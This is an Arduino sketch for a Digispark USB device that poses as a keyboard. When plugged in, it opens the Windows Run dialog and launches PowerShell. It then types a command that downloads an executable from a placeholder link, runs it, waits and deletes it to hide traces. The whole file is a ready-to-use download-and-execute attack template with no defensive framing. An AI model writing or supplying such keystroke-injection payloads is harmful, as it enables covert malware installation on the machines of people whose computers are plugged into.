#include <DigiKeyboard.h>

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(300);

 
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);


  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

 
  DigiKeyboard.print(
    "$u='your download link';"
    "$o=\"$env:USERPROFILE\\Downloads\\main.exe\";"
    "iwr -Uri $u -OutFile $o;"
    "Start-Process $o;"
    "Start-Sleep 15;"
    "Remove-Item $o -Force;"
    "exit;"
  );
  
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
  
}
